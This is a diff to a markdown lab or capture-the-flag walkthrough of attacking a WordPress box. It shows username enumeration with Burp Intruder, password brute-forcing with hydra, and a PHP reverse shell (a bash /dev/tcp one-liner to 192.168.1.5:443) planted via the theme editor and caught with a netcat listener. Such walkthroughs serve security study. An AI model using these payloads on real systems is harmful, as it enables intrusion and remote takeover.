@@ -40,8 +40,9 @@ dirb scan also flagged a wp login page ```http://192.168.1.8/wp-login```. That g
 ## User Enumeration: Cracking the login id
 Used burpsuit intruder tool to determine the user name from the wordlist 'fsocity.dic'
 ### Key findings
-Invalid Users: Triggered an error invalid user and password.
 Valid User ("Elliot"): Triggered a specific message: "The password you entered for the username Elliot is incorrect."
+
+![intruder attack](./image/Intruder%20attack%20user%20name.png)
 
 ## Password Attack
 In order to get the password for the user "Elliot" I used hydra to bruteforce attack
@@ -57,6 +58,9 @@ After successfully logged into the website then I navigated to Appearance > Edit
     <?php
       exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/443 0>&1'");
     ?>
+
+
+
 ### Netcat listener
  ```nc -lvp 443 ``` Successfully captured reversed shell as deamon@linux user.
 
